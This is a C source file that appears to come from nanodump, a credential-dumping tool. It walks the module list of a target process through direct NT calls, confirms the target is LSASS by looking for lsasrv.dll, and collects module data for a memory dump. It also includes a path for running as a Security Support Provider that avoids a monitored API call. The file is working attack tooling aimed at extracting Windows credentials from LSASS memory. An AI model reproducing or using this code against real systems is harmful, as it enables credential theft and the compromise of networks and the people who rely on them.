#include "modules.h"

PVOID get_peb_address(
    IN HANDLE hProcess)
{
#ifdef SSP
    UNUSED(hProcess);
    // if nanodump is running as an SSP,
    // avoid calling NtQueryInformationProcess
    return (PVOID)READ_MEMLOC(PEB_OFFSET);
#else
    PROCESS_BASIC_INFORMATION basic_info = { 0 };
    basic_info.PebBaseAddress = 0;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationProcess", status);
        DPRINT_ERR("Could not get the PEB of the process");
        return 0;
    }

    return basic_info.PebBaseAddress;
#endif
}

PVOID get_module_list_address(
    IN HANDLE hProcess,
    IN BOOL is_lsass)
{
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

    ldr_pointer = RVA(PVOID, peb_address, LDR_POINTER_OFFSET);

    ldr_address = 0;
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        sizeof(PVOID),
        NULL);
    if (!NT_SUCCESS(status) && !is_lsass)
    {
        // failed to read the memory of some process, simply continue
        return NULL;
    }
    if (!NT_SUCCESS(status) && is_lsass)
    {
        if (status == STATUS_ACCESS_DENIED)
        {
            PRINT_ERR("Failed to read " LSASS ", status: STATUS_ACCESS_DENIED");
        }
        else
        {
            PRINT_ERR("Failed to read " LSASS ", status: 0x%lx", status);
        }
        return NULL;
    }

    module_list_pointer = RVA(PVOID, ldr_address, MODULE_LIST_POINTER_OFFSET);

    ldr_entry_address = NULL;
    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        sizeof(PVOID),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtReadVirtualMemory", status);
        DPRINT_ERR("Could not get the address of the module list");
        return NULL;
    }
    DPRINT(
        "Got the address of the module list: 0x%p",
        ldr_entry_address);
    return ldr_entry_address;
}

Pmodule_info add_new_module(
    IN HANDLE hProcess,
    IN struct LDR_DATA_TABLE_ENTRY* ldr_entry)
{
    DWORD name_size;
    Pmodule_info new_module = intAlloc(sizeof(module_info));
    if (!new_module)
    {
        malloc_failed();
        DPRINT_ERR("Could not add new module");
        return NULL;
    }
    new_module->next = NULL;
    new_module->dll_base = (ULONG64)(ULONG_PTR)ldr_entry->DllBase;
    new_module->size_of_image = ldr_entry->SizeOfImage;
    new_module->TimeDateStamp = ldr_entry->TimeDateStamp;
    new_module->CheckSum = ldr_entry->CheckSum;

    name_size = ldr_entry->FullDllName.Length > sizeof(new_module->dll_name) ?
        sizeof(new_module->dll_name) : ldr_entry->FullDllName.Length;

    // read the full path of the DLL
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_entry->FullDllName.Buffer,
        new_module->dll_name,
        name_size,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtReadVirtualMemory", status);
        DPRINT_ERR("Could not add new module");
        return NULL;
    }
    return new_module;
}

BOOL read_ldr_entry(
    IN HANDLE hProcess,
    IN PVOID ldr_entry_address,
    OUT struct LDR_DATA_TABLE_ENTRY* ldr_entry,
    OUT wchar_t* base_dll_name)
{
    // read the entry
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        ldr_entry_address,
        ldr_entry,
        sizeof(struct LDR_DATA_TABLE_ENTRY),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtReadVirtualMemory", status);
        DPRINT_ERR(
            "Could not read module information at: 0x%p",
            ldr_entry_address);
        return FALSE;
    }
    // initialize base_dll_name with all null-bytes
    memset(base_dll_name, 0, MAX_PATH);
    // read the dll name
    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_entry->BaseDllName.Buffer,
        base_dll_name,
        ldr_entry->BaseDllName.Length,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtReadVirtualMemory", status);
        DPRINT_ERR(
            "Could not read module information at: 0x%p",
            ldr_entry->BaseDllName.Buffer);
        return FALSE;
    }
    return TRUE;
}

Pmodule_info find_modules(
    IN HANDLE hProcess,
    IN wchar_t* important_modules[],
    IN int number_of_important_modules,
    IN BOOL is_lsass)
{
    // module list
    Pmodule_info module_list = NULL;

    // find the address of LDR_DATA_TABLE_ENTRY
    PVOID ldr_entry_address = get_module_list_address(
        hProcess,
        is_lsass);
    if (!ldr_entry_address)
        return NULL;

    PVOID first_ldr_entry_address = NULL;
    SHORT dlls_found = 0;
    BOOL lsasrv_found = FALSE;
    struct LDR_DATA_TABLE_ENTRY ldr_entry;
    wchar_t base_dll_name[MAX_PATH];
    // loop over each DLL loaded, looking for the important modules
    while (dlls_found < number_of_important_modules)
    {
        // read the current entry
        BOOL success = read_ldr_entry(
            hProcess,
            ldr_entry_address,
            &ldr_entry,
            base_dll_name);
        if (!success)
            return NULL;

        if (!first_ldr_entry_address)
            first_ldr_entry_address = ldr_entry.InMemoryOrderLinks.Blink;

        // loop over each important module and see if we have a match
        for (int i = 0; i < number_of_important_modules; i++)
        {
            // compare the DLLs' name, case insensitive
            if (!_wcsicmp(important_modules[i], base_dll_name))
            {
                DPRINT(
                    "Found %ls at 0x%p",
                    base_dll_name,
                    ldr_entry_address);
                // check if the DLL is 'lsasrv.dll' so that we know the process is indeed LSASS
                if (!_wcsicmp(important_modules[i], LSASRV_DLL))
                    lsasrv_found = TRUE;

                // add the new module to the linked list
                Pmodule_info new_module = add_new_module(
                    hProcess,
                    &ldr_entry);
                if (!new_module)
                    return NULL;

                if (!module_list)
                {
                    module_list = new_module;
                }
                else
                {
                    Pmodule_info last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }
                dlls_found++;
                break;
            }
        }

        // set the next entry as the current entry
        ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
        // if we are back at the beginning, break
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }
    // the LSASS process should always have 'lsasrv.dll' loaded
    if (is_lsass && !lsasrv_found)
    {
        PRINT_ERR("The selected process is not " LSASS ".");
        return NULL;
    }
    return module_list;
}
